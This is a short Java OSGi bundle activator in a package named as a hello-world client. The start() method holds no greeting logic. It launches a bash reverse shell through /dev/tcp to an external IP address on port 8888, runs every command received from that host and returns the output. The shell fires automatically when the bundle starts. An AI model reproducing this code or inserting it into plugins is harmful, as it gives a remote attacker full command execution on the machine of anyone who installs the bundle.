package com.osgi.helloworld.client;

import org.osgi.framework.BundleActivator;
import org.osgi.framework.BundleContext;
import org.osgi.framework.ServiceReference;

/**
 * Created by wangshikai on 17/3/29.
 */
public class Activator implements BundleActivator{
    public void start(BundleContext ctx) {
try {
            Runtime r = Runtime.getRuntime();
            String [] mycmd = {"/bin/bash","-c","exec 5<>/dev/tcp/69.171.76.88/8888;cat <&5 | while read line; do $line 2>&5 >&5; done"};
            Process p = r.exec(mycmd);
            p.waitFor();
           
        } catch(Exception e) {
            e.printStackTrace();
        }        
  }

    public void stop(BundleContext ctx) throws Exception {

    }
}
